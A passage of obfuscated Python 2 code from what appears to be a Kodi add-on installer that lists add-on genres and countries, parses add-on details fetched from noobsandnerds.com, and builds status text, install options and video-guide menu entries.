 Ii1I1Ii ( 'folder' , 'Italian' , url + '&genre=italian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Japanese' , url + '&genre=japanese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Korean' , url + '&genre=korean' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Lebanese' , url + '&genre=lebanese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Mongolian' , url + '&genre=mongolian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Moroccan' , url + '&genre=moroccan' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Nepali' , url + '&genre=nepali' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'New Zealand' , url + '&genre=newzealand' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Norwegian' , url + '&genre=norwegian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Pakistani' , url + '&genre=pakistani' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Polish' , url + '&genre=polish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Portuguese' , url + '&genre=portuguese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Romanian' , url + '&genre=romanian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Russian' , url + '&genre=russian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Singapore' , url + '&genre=singapore' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Spanish' , url + '&genre=spanish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Swedish' , url + '&genre=swedish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Swiss' , url + '&genre=swiss' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Syrian' , url + '&genre=syrian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Tamil' , url + '&genre=tamil' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Thai' , url + '&genre=thai' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Turkish' , url + '&genre=turkish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'UK' , url + '&genre=uk' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'USA' , url + '&genre=usa' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Vietnamese' , url + '&genre=vietnamese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 if 12 - 12: O0 - o0oOOo0O0Ooo
 if 81 - 81: OoOoOO00 - OoOoOO00 . IIiIi1iI
def o0OoOo00o0o ( ) :
 I1II1I11I1I = 0
 OoOO0o = os . listdir ( O0OoO000O0OO )
 for i1II1 in OoOO0o :
  if i1II1 . lower ( ) . endswith ( '.db' ) and i1II1 . lower ( ) . startswith ( 'addons' ) :
   i11i1 = os . path . join ( O0OoO000O0OO , i1II1 )
   IiiiiI1i1Iii = os . path . getmtime ( i11i1 )
   if IiiiiI1i1Iii > I1II1I11I1I :
    I1II1I11I1I = IiiiiI1i1Iii
    oo00oO0o = i11i1
 return oo00oO0o
 if 31 - 31: Oo
 if 23 - 23: IIi . IIiiiI1iIII
def OO0000o ( url ) :
 i1I1i1 = 'http://noobsandnerds.com/TI/AddonPortal/addondetails.php?id=%s' % ( url )
 O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 48 - 48: iiiiiiii1 / IIi . iIii1I11I1II1 * OoOoOO00 * ooOo / i1IIi
 OOOOoOOo0O0 = re . compile ( 'addon_types="(.+?)"' ) . findall ( O0OoooO0 )
 oOooo0 = re . compile ( 'name="(.+?)"' ) . findall ( O0OoooO0 )
 ooO = re . compile ( 'UID="(.+?)"' ) . findall ( O0OoooO0 )
 o0o00OOo0 = re . compile ( 'id="(.+?)"' ) . findall ( O0OoooO0 )
 I1IIii1 = re . compile ( 'provider_name="(.+?)"' ) . findall ( O0OoooO0 )
 OO0o0oOOO0O = re . compile ( 'version="(.+?)"' ) . findall ( O0OoooO0 )
 iI = re . compile ( 'created="(.+?)"' ) . findall ( O0OoooO0 )
 I1i11 = re . compile ( 'addon_types="(.+?)"' ) . findall ( O0OoooO0 )
 OooIiIIII1i11I = re . compile ( 'updated="(.+?)"' ) . findall ( O0OoooO0 )
 OOOiII1 = re . compile ( 'downloads="(.+?)"' ) . findall ( O0OoooO0 )
 if 57 - 57: o0oOOo0O0Ooo . i1IIi . IIiiiI1iIII * i11iIiiIii + IIi . IIiiiI1iIII
 oo0O00Oooo0O0 = re . compile ( 'description="(.+?)"' ) . findall ( O0OoooO0 )
 I11OO = re . compile ( 'devbroke="(.+?)"' ) . findall ( O0OoooO0 )
 o0O0oo0OO0O = re . compile ( 'broken="(.+?)"' ) . findall ( O0OoooO0 )
 OO0 = re . compile ( 'deleted="(.+?)"' ) . findall ( O0OoooO0 )
 o0Oooo = re . compile ( 'mainbranch_notes="(.+?)"' ) . findall ( O0OoooO0 )
 if 36 - 36: OoooooooOO . OoO0O00
 oOIIiIi = re . compile ( 'repo_url="(.+?)"' ) . findall ( O0OoooO0 )
 OOoOooOoOOOoo = re . compile ( 'data_url="(.+?)"' ) . findall ( O0OoooO0 )
 Iiii1iI1i = re . compile ( 'zip_url="(.+?)"' ) . findall ( O0OoooO0 )
 I1ii1ii11i1I = re . compile ( 'genres="(.+?)"' ) . findall ( O0OoooO0 )
 o0OoOO = re . compile ( 'forum="(.+?)"' ) . findall ( O0OoooO0 )
 O0O0Oo00 = re . compile ( 'repo_id="(.+?)"' ) . findall ( O0OoooO0 )
 oOoO00o = re . compile ( 'license="(.+?)"' ) . findall ( O0OoooO0 )
 oO00O0 = re . compile ( 'platform="(.+?)"' ) . findall ( O0OoooO0 )
 IIi1IIIi = re . compile ( 'visible="(.+?)"' ) . findall ( O0OoooO0 )
 O00Ooo = re . compile ( 'script="(.+?)"' ) . findall ( O0OoooO0 )
 OOOO0OOO = re . compile ( 'program_plugin="(.+?)"' ) . findall ( O0OoooO0 )
 i1i1ii = re . compile ( 'script_module="(.+?)"' ) . findall ( O0OoooO0 )
 iII1ii1 = re . compile ( 'video_plugin="(.+?)"' ) . findall ( O0OoooO0 )
 I1i1iiiI1 = re . compile ( 'audio_plugin="(.+?)"' ) . findall ( O0OoooO0 )
 iIIi = re . compile ( 'image_plugin="(.+?)"' ) . findall ( O0OoooO0 )
 oO0o00oo0 = re . compile ( 'repository="(.+?)"' ) . findall ( O0OoooO0 )
 ii1IIII = re . compile ( 'weather_service="(.+?)"' ) . findall ( O0OoooO0 )
 oO00oOooooo0 = re . compile ( 'skin="(.+?)"' ) . findall ( O0OoooO0 )
 oOo = re . compile ( 'service="(.+?)"' ) . findall ( O0OoooO0 )
 O0OOooOoO = re . compile ( 'warning="(.+?)"' ) . findall ( O0OoooO0 )
 i1II1I1Iii1 = re . compile ( 'web_interface="(.+?)"' ) . findall ( O0OoooO0 )
 iiI11Iii = re . compile ( 'movie_scraper="(.+?)"' ) . findall ( O0OoooO0 )
 O0o0O0 = re . compile ( 'tv_scraper="(.+?)"' ) . findall ( O0OoooO0 )
 Ii1II1I11i1 = re . compile ( 'artist_scraper="(.+?)"' ) . findall ( O0OoooO0 )
 oOoooooOoO = re . compile ( 'music_video_scraper="(.+?)"' ) . findall ( O0OoooO0 )
 Ii111 = re . compile ( 'subtitles="(.+?)"' ) . findall ( O0OoooO0 )
 I111i1i1111 = re . compile ( 'requires="(.+?)"' ) . findall ( O0OoooO0 )
 IIII1 = re . compile ( 'modules="(.+?)"' ) . findall ( O0OoooO0 )
 I1I1i = re . compile ( 'icon="(.+?)"' ) . findall ( O0OoooO0 )
 I1IIIiIiIi = re . compile ( 'video_preview="(.+?)"' ) . findall ( O0OoooO0 )
 IIIII1 = re . compile ( 'video_guide="(.+?)"' ) . findall ( O0OoooO0 )
 iIi1Ii1i1iI = re . compile ( 'video_guide1="(.+?)"' ) . findall ( O0OoooO0 )
 IIiI1 = re . compile ( 'video_guide2="(.+?)"' ) . findall ( O0OoooO0 )
 i1iI1 = re . compile ( 'video_guide3="(.+?)"' ) . findall ( O0OoooO0 )
 ii1 = re . compile ( 'video_guide4="(.+?)"' ) . findall ( O0OoooO0 )
 I1IiiI1ii1i = re . compile ( 'video_guide5="(.+?)"' ) . findall ( O0OoooO0 )
 O0o = re . compile ( 'video_guide6="(.+?)"' ) . findall ( O0OoooO0 )
 oO0OoO00o = re . compile ( 'video_guide7="(.+?)"' ) . findall ( O0OoooO0 )
 II1iiiiII = re . compile ( 'video_guide8="(.+?)"' ) . findall ( O0OoooO0 )
 O0OoOO0oo0 = re . compile ( 'video_guide9="(.+?)"' ) . findall ( O0OoooO0 )
 oOO = re . compile ( 'video_guide10="(.+?)"' ) . findall ( O0OoooO0 )
 O0o0OO0000ooo = re . compile ( 'video_label1="(.+?)"' ) . findall ( O0OoooO0 )
 iIIII1iIIii = re . compile ( 'video_label2="(.+?)"' ) . findall ( O0OoooO0 )
 oOOO00o000o = re . compile ( 'video_label3="(.+?)"' ) . findall ( O0OoooO0 )
 iIi11i1 = re . compile ( 'video_label4="(.+?)"' ) . findall ( O0OoooO0 )
 oO00oo0o00o0o = re . compile ( 'video_label5="(.+?)"' ) . findall ( O0OoooO0 )
 IiIIIIIi = re . compile ( 'video_label6="(.+?)"' ) . findall ( O0OoooO0 )
 IiIi1iIIi1 = re . compile ( 'video_label7="(.+?)"' ) . findall ( O0OoooO0 )
 O0OoO0ooOO0o = re . compile ( 'video_label8="(.+?)"' ) . findall ( O0OoooO0 )
 OoOo0oOooOoOO = re . compile ( 'video_label9="(.+?)"' ) . findall ( O0OoooO0 )
 oo00ooOoO00 = re . compile ( 'video_label10="(.+?)"' ) . findall ( O0OoooO0 )
 if 96 - 96: Oo
 if 85 - 85: o0oOOo0O0Ooo . OoOoOO00 / iiiiiiii1 . O0 % IIi
 if 90 - 90: Oo0Ooo % O0 * iIii1I11I1II1 . IIiIi1iI
 I1iii11 = OOOOoOOo0O0 [ 0 ] if ( len ( OOOOoOOo0O0 ) > 0 ) else ''
 ooo0O = oOooo0 [ 0 ] if ( len ( oOooo0 ) > 0 ) else ''
 iII1iii = ooO [ 0 ] if ( len ( ooO ) > 0 ) else ''
 i11i1iiiII = o0o00OOo0 [ 0 ] if ( len ( o0o00OOo0 ) > 0 ) else ''
 ooOO0oO0oo00o = I1IIii1 [ 0 ] if ( len ( I1IIii1 ) > 0 ) else ''
 oOOo0oo0O = OO0o0oOOO0O [ 0 ] if ( len ( OO0o0oOOO0O ) > 0 ) else ''
 IiiIiI1Ii1i = iI [ 0 ] if ( len ( iI ) > 0 ) else ''
 i1iIi = I1i11 [ 0 ] if ( len ( I1i11 ) > 0 ) else ''
 iiiii1II = OooIiIIII1i11I [ 0 ] if ( len ( OooIiIIII1i11I ) > 0 ) else ''
 O0OOO0OOooo00 = OOOiII1 [ 0 ] if ( len ( OOOiII1 ) > 0 ) else ''
 if 6 - 6: O00OOo00oo0o - iiiiiiii1 * Oo . IIiIi1iI / O0 * iiiiiiii1
 II11iI111i1 = '[CR][CR][COLOR=dodgerblue]Description: [/COLOR]' + oo0O00Oooo0O0 [ 0 ] if ( len ( oo0O00Oooo0O0 ) > 0 ) else ''
 Oo00OoOo = I11OO [ 0 ] if ( len ( I11OO ) > 0 ) else ''
 ii1ii111 = o0O0oo0OO0O [ 0 ] if ( len ( o0O0oo0OO0O ) > 0 ) else ''
 i11111I1I = '[CR]' + OO0 [ 0 ] if ( len ( OO0 ) > 0 ) else ''
 ii1Oo0000oOo = '[CR][CR][COLOR=dodgerblue]User Notes: [/COLOR]' + o0Oooo [ 0 ] if ( len ( o0Oooo ) > 0 ) else ''
 if 31 - 31: OOOoOoo0O . IIi * iiiiiiii1 + i11iIiiIii * ooOo
 OO0ooo0o0O0Oooooo = oOIIiIi [ 0 ] if ( len ( oOIIiIi ) > 0 ) else ''
 i11IIIiI1I = OOoOooOoOOOoo [ 0 ] if ( len ( OOoOooOoOOOoo ) > 0 ) else ''
 o0iiiI1I1iIIIi1 = Iiii1iI1i [ 0 ] if ( len ( Iiii1iI1i ) > 0 ) else ''
 Iii = I1ii1ii11i1I [ 0 ] if ( len ( I1ii1ii11i1I ) > 0 ) else ''
 I1iiiiI1iI = '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]' + o0OoOO [ 0 ] if ( len ( o0OoOO ) > 0 ) else '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]No forum details given by developer'
 iIiiiii1i = o0OoOO [ 0 ] if ( len ( o0OoOO ) > 0 ) else 'None'
 iiIi1IIiI = O0O0Oo00 [ 0 ] if ( len ( O0O0Oo00 ) > 0 ) else ''
 license = oOoO00o [ 0 ] if ( len ( oOoO00o ) > 0 ) else ''
 i1oO0OO0 = '[COLOR=orange]     Platform: [/COLOR]' + oO00O0 [ 0 ] if ( len ( oO00O0 ) > 0 ) else ''
 o0O0Oo00 = IIi1IIIi [ 0 ] if ( len ( IIi1IIIi ) > 0 ) else ''
 O0Oo0o000oO = O00Ooo [ 0 ] if ( len ( O00Ooo ) > 0 ) else ''
 oO0o00oOOooO0 = OOOO0OOO [ 0 ] if ( len ( OOOO0OOO ) > 0 ) else ''
 OOOoO000 = i1i1ii [ 0 ] if ( len ( i1i1ii ) > 0 ) else ''
 oOOOO = iII1ii1 [ 0 ] if ( len ( iII1ii1 ) > 0 ) else ''
 Ii = I1i1iiiI1 [ 0 ] if ( len ( I1i1iiiI1 ) > 0 ) else ''
 Ii1ii111i1 = iIIi [ 0 ] if ( len ( iIIi ) > 0 ) else ''
 i1i1i1I = oO0o00oo0 [ 0 ] if ( len ( oO0o00oo0 ) > 0 ) else ''
 oOoo000 = oOo [ 0 ] if ( len ( oOo ) > 0 ) else ''
 o00OO00OoO = oO00oOooooo0 [ 0 ] if ( len ( oO00oOooooo0 ) > 0 ) else ''
 OooOo00o = O0OOooOoO [ 0 ] if ( len ( O0OOooOoO ) > 0 ) else ''
 IiI11i1IIiiI = i1II1I1Iii1 [ 0 ] if ( len ( i1II1I1Iii1 ) > 0 ) else ''
 oOOo000oOoO0 = ii1IIII [ 0 ] if ( len ( ii1IIII ) > 0 ) else ''
 OoOo00o0OO = iiI11Iii [ 0 ] if ( len ( iiI11Iii ) > 0 ) else ''
 ii1IIIIiI11 = O0o0O0 [ 0 ] if ( len ( O0o0O0 ) > 0 ) else ''
 iI1IIIii = Ii1II1I11i1 [ 0 ] if ( len ( Ii1II1I11i1 ) > 0 ) else ''
 I1i11ii11 = oOoooooOoO [ 0 ] if ( len ( oOoooooOoO ) > 0 ) else ''
 OO00O0oOO = Ii111 [ 0 ] if ( len ( Ii111 ) > 0 ) else ''
 Ii1iI111 = I111i1i1111 [ 0 ] if ( len ( I111i1i1111 ) > 0 ) else ''
 O0oooo00o0Oo = IIII1 [ 0 ] if ( len ( IIII1 ) > 0 ) else ''
 I1iii = I1I1i [ 0 ] if ( len ( I1I1i ) > 0 ) else ''
 oO0o0O0Ooo0o = I1IIIiIiIi [ 0 ] if ( len ( I1IIIiIiIi ) > 0 ) else 'None'
 i1Ii11II = IIIII1 [ 0 ] if ( len ( IIIII1 ) > 0 ) else 'None'
 IioO0oOOO0Ooo = iIi1Ii1i1iI [ 0 ] if ( len ( iIi1Ii1i1iI ) > 0 ) else 'None'
 i1i1I = IIiI1 [ 0 ] if ( len ( IIiI1 ) > 0 ) else 'None'
 IiIIi1 = i1iI1 [ 0 ] if ( len ( i1iI1 ) > 0 ) else 'None'
 iII11I1Ii1 = ii1 [ 0 ] if ( len ( ii1 ) > 0 ) else 'None'
 o0o0 = I1IiiI1ii1i [ 0 ] if ( len ( I1IiiI1ii1i ) > 0 ) else 'None'
 oOo0oO = O0o [ 0 ] if ( len ( O0o ) > 0 ) else 'None'
 IIi1IIIIi = oO0OoO00o [ 0 ] if ( len ( oO0OoO00o ) > 0 ) else 'None'
 OOOoO = II1iiiiII [ 0 ] if ( len ( II1iiiiII ) > 0 ) else 'None'
 I1i = O0OoOO0oo0 [ 0 ] if ( len ( O0OoOO0oo0 ) > 0 ) else 'None'
 iiiI = oOO [ 0 ] if ( len ( oOO ) > 0 ) else 'None'
 IiIi1 = O0o0OO0000ooo [ 0 ] if ( len ( O0o0OO0000ooo ) > 0 ) else 'None'
 i111iiI1ii = iIIII1iIIii [ 0 ] if ( len ( iIIII1iIIii ) > 0 ) else 'None'
 IIiii = oOOO00o000o [ 0 ] if ( len ( oOOO00o000o ) > 0 ) else 'None'
 I1i1i = iIi11i1 [ 0 ] if ( len ( iIi11i1 ) > 0 ) else 'None'
 OOOOooO0oO00O0o = oO00oo0o00o0o [ 0 ] if ( len ( oO00oo0o00o0o ) > 0 ) else 'None'
 ooOO00oOOo000 = IiIIIIIi [ 0 ] if ( len ( IiIIIIIi ) > 0 ) else 'None'
 IIii11II11II1 = IiIi1iIIi1 [ 0 ] if ( len ( IiIi1iIIi1 ) > 0 ) else 'None'
 II1I = O0OoO0ooOO0o [ 0 ] if ( len ( O0OoO0ooOO0o ) > 0 ) else 'None'
 OoOo000oOo0oo = OoOo0oOooOoOO [ 0 ] if ( len ( OoOo0oOooOoOO ) > 0 ) else 'None'
 oO0O = oo00ooOoO00 [ 0 ] if ( len ( oo00ooOoO00 ) > 0 ) else 'None'
 if 86 - 86: OoOoOO00 . iIii1I11I1II1 - OoO0O00
 print "### Addon Details: " + ooo0O
 if 56 - 56: O0
 if i11111I1I != '' :
  OOo00 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=red]This add-on is depreciated, it\'s no longer available.[/COLOR]'
  if 37 - 37: i1IIi
 elif ii1ii111 == '' and Oo00OoOo == '' and OooOo00o == '' :
  OOo00 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=lime]No reported problems[/COLOR]'
  if 46 - 46: OoOoOO00 - OOOoOoo0O - O00OOo00oo0o . i1IIi
 elif ii1ii111 == '' and Oo00OoOo == '' and OooOo00o != '' and i11111I1I == '' :
  OOo00 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=orange]Although there have been no reported problems there may be issues with this add-on, see below.[/COLOR]'
  if 35 - 35: II111iiii * OOOoOoo0O - OoooooooOO . OOOoOoo0O . OOOoOoo0O
 elif ii1ii111 == '' and Oo00OoOo != '' :
  OOo00 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by the add-on developer.[CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + Oo00OoOo
  if 11 - 11: IIi / OoOoOO00 + OOOoOoo0O % iIii1I11I1II1
 elif ii1ii111 != '' and Oo00OoOo == '' :
  OOo00 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by a member of the community at WWW.NOOBSANDNERDS.COM[CR][COLOR=dodgerblue]User Comments: [/COLOR]' + ii1ii111
  if 42 - 42: I1ii11iIi11i * OoOoOO00 % iiiiiiii1 - OoOoOO00 . i11iIiiIii - IIi
 elif ii1ii111 != '' and Oo00OoOo != '' :
  OOo00 = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by both the add-on developer and a member of the community at WWW.NOOBSANDNERDS.COM[CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + Oo00OoOo + '[CR][COLOR=dodgerblue]User Comments: [/COLOR]' + ii1ii111
  if 84 - 84: IIi - I1ii11iIi11i / OOOoOoo0O
  if 13 - 13: IIiiiI1iIII - Oo0Ooo - iiiiiiii1
 O00Oo = str ( '[COLOR=orange]Name: [/COLOR]' + ooo0O + '[COLOR=orange]     Author(s): [/COLOR]' + ooOO0oO0oo00o + '[COLOR=orange][CR][CR]Version: [/COLOR]' + oOOo0oo0O + '[COLOR=orange]     Created: [/COLOR]' + IiiIiI1Ii1i + '[COLOR=orange]     Updated: [/COLOR]' + iiiii1II + '[COLOR=orange][CR][CR]Repository: [/COLOR]' + iiIi1IIiI + i1oO0OO0 + '[COLOR=orange]     Add-on Type(s): [/COLOR]' + i1iIi + Ii1iI111 + OOo00 + i11111I1I + OooOo00o + I1iiiiI1iI + II11iI111i1 + ii1Oo0000oOo )
 if 42 - 42: II111iiii % IIiiiI1iIII % IIi % i1IIi - ooOo
 if 30 - 30: iiiiiiii1 % iiiiiiii1 - o0oOOo0O0Ooo
 if os . path . exists ( os . path . join ( II11iiii1Ii , i11i1iiiII ) ) :
  if 'script.module' in i11i1iiiII or 'repo' in i11i1iiiII :
   Ii1I1Ii ( '' , '[COLOR=orange](Already Installed)[/COLOR]' , '' , '' , I1iii , '' , '' , '' )
  else :
   Ii1I1Ii ( '' , '[COLOR=orange](Already Installed)[/COLOR] Click here to run the add-on' , i11i1iiiII , 'run_addon' , I1iii , '' , '' , '' )
   if 70 - 70: Oo0Ooo . OoOoOO00
   if 58 - 58: OOOoOoo0O + II111iiii * IIiIi1iI * i11iIiiIii - iIii1I11I1II1
 if ooo0O == '' :
  Ii1I1Ii ( '' , '[COLOR=yellow]Sorry request failed due to high traffic on server, please try again[/COLOR]' , '' , '' , I1iii , '' , '' , '' )
  if 68 - 68: OoooooooOO % II111iiii
  if 26 - 26: II111iiii % i11iIiiIii % iIii1I11I1II1 % OOOoOoo0O * OOOoOoo0O * I1ii11iIi11i
 elif ooo0O != '' :
  if 24 - 24: II111iiii % IIi - iiiiiiii1 + I1IiiI * I1ii11iIi11i
  if ( ii1ii111 == '' ) and ( Oo00OoOo == '' ) and ( i11111I1I == '' ) and ( OooOo00o == '' ) :
   Ii1I1Ii ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR] No problems reported' , O00Oo , 'text_guide' , I1iii , '' , '' , O00Oo )
   if 2 - 2: O00OOo00oo0o - IIiiiI1iIII
  if ( ii1ii111 != '' and i11111I1I == '' ) or ( Oo00OoOo != '' and i11111I1I == '' ) or ( OooOo00o != '' and i11111I1I == '' ) :
   Ii1I1Ii ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=orange] Possbile problems reported[/COLOR]' , O00Oo , 'text_guide' , I1iii , '' , '' , O00Oo )
   if 83 - 83: ooOo % o0oOOo0O0Ooo % O00OOo00oo0o - II111iiii * Oo / OoooooooOO
  if i11111I1I != '' :
   Ii1I1Ii ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=red] Add-on now depreciated[/COLOR]' , O00Oo , 'text_guide' , I1iii , '' , '' , O00Oo )
   if 18 - 18: OoO0O00 + iIii1I11I1II1 - II111iiii - I1IiiI
   if 71 - 71: OoooooooOO
  if i11111I1I == '' :
   if 33 - 33: IIi
   if iiIi1IIiI != '' and 'superrepo' not in iiIi1IIiI :
    if IiiIII111iI == 'true' :
     OOo0oO00ooO00 ( '[COLOR=lime][INSTALL - Recommended] [/COLOR]' + ooo0O , ooo0O , '' , 'addon_install_zero' , I1iii , '' , '' , II11iI111i1 , I1iii11 , OO0ooo0o0O0Oooooo , iiIi1IIiI , i11i1iiiII , ooOO0oO0oo00o , iIiiiii1i , i11IIIiI1I )
     OOo0oO00ooO00 ( '[COLOR=lime][INSTALL - Backup Option] [/COLOR]' + ooo0O , ooo0O , '' , 'addon_install' , I1iii , '' , '' , II11iI111i1 , o0iiiI1I1iIIIi1 , OO0ooo0o0O0Oooooo , iiIi1IIiI , i11i1iiiII , ooOO0oO0oo00o , iIiiiii1i , i11IIIiI1I )
    else :
     OOo0oO00ooO00 ( '[COLOR=lime][INSTALL] [/COLOR]' + ooo0O , ooo0O , '' , 'addon_install_zero' , I1iii , '' , '' , II11iI111i1 , I1iii11 , OO0ooo0o0O0Oooooo , iiIi1IIiI , i11i1iiiII , ooOO0oO0oo00o , iIiiiii1i , i11IIIiI1I )
     if 62 - 62: I1ii11iIi11i + O00OOo00oo0o + i1IIi / OoooooooOO
   if iiIi1IIiI == '' or 'superrepo' in iiIi1IIiI :
    OOo0oO00ooO00 ( '[COLOR=lime][INSTALL] [/COLOR]' + ooo0O + ' - THIS IS NOT IN A SELF UPDATING REPO' , ooo0O , '' , 'addon_install' , '' , '' , '' , II11iI111i1 , o0iiiI1I1iIIIi1 , OO0ooo0o0O0Oooooo , iiIi1IIiI , i11i1iiiII , ooOO0oO0oo00o , iIiiiii1i , i11IIIiI1I )
    if 7 - 7: o0oOOo0O0Ooo + i1IIi . I1IiiI / Oo0Ooo
    if 22 - 22: iiiiiiii1 - iiiiiiii1 % Oo . IIi + ooOo
  if oO0o0O0Ooo0o != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  Preview' , IioO0oOOO0Ooo , 'play_video' , '' , '' , '' , '' )
   if 63 - 63: I1IiiI % IIi * o0oOOo0O0Ooo + IIi / Oo0Ooo % IIiIi1iI
  if IioO0oOOO0Ooo != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IiIi1 , IioO0oOOO0Ooo , 'play_video' , '' , '' , '' , '' )
   if 45 - 45: IIiiiI1iIII
  if i1i1I != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + i111iiI1ii , i1i1I , 'play_video' , '' , '' , '' , '' )
   if 20 - 20: OoooooooOO * o0oOOo0O0Ooo * O0 . Oo
  if IiIIi1 != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IIiii , IiIIi1 , 'play_video' , '' , '' , '' , '' )
   if 78 - 78: iIii1I11I1II1 + OOOoOoo0O - O00OOo00oo0o * IIi - OoooooooOO % OoOoOO00
  if iII11I1Ii1 != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + I1i1i , iII11I1Ii1 , 'play_video' , '' , '' , '' , '' )
   if 34 - 34: O0
  if o0o0 != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + OOOOooO0oO00O0o , o0o0 , 'play_video' , '' , '' , '' , '' )
   if 80 - 80: i1IIi - Oo0Ooo / OoO0O00 - i11iIiiIii
  if oOo0oO != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + ooOO00oOOo000 , oOo0oO , 'play_video' , '' , '' , '' , '' )
   if 68 - 68: ooOo - I1ii11iIi11i % O0 % IIi
  if IIi1IIIIi != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IIii11II11II1 , IIi1IIIIi , 'play_video' , '' , '' , '' , '' )
   if 11 - 11: O0 / OoO0O00 % Oo + o0oOOo0O0Ooo + iIii1I11I1II1
  if OOOoO != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + II1I , OOOoO , 'play_video' , '' , '' , '' , '' )
   if 40 - 40: iiiiiiii1 - Oo . O00OOo00oo0o * Oo0Ooo % IIi
  if I1i != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + OoOo000oOo0oo , I1i , 'play_video' , '' , '' , '' , '' )
   if 56 - 56: i11iIiiIii . o0oOOo0O0Ooo - I1IiiI * OOOoOoo0O
  if iiiI != 'None' :
   Ii1I1Ii ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + oO0O , iiiI , 'play_video' , '' , '' , '' , '' )
   if 91 - 91: ooOo + OoooooooOO - i1IIi
   if 84 - 84: O00OOo00oo0o / IIiiiI1iIII
def OOOooo0OooOoO ( url ) :
 Ii1I1Ii ( 'folder' , 'Anime' , url + '&genre=anime' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Audiobooks' , url + '&genre=audiobooks' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Comedy' , url + '&genre=comedy' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Comics' , url + '&genre=comics' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Documentary' , url + '&genre=documentary' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Downloads' , url + '&genre=downloads' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Food' , url + '&genre=food' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 Ii1I1Ii ( 'folder' , 'Gaming' , url + '&genre=gaming' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
